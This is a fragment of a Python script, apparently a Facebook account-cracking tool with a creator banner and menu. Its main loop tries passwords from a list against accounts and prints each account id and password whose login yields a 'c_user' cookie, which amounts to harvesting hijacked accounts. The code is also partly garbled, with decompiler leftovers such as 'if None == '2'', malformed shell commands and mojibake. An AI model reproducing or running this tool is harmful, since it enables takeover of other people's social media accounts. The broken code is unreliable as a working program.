...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/mahadihasanjihad009')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMAHADI\33[0;m\033[1;32m && \033[1;33mHASAN\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MAHADI HASAN JIHAD
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mmahadi099
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MAHADI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
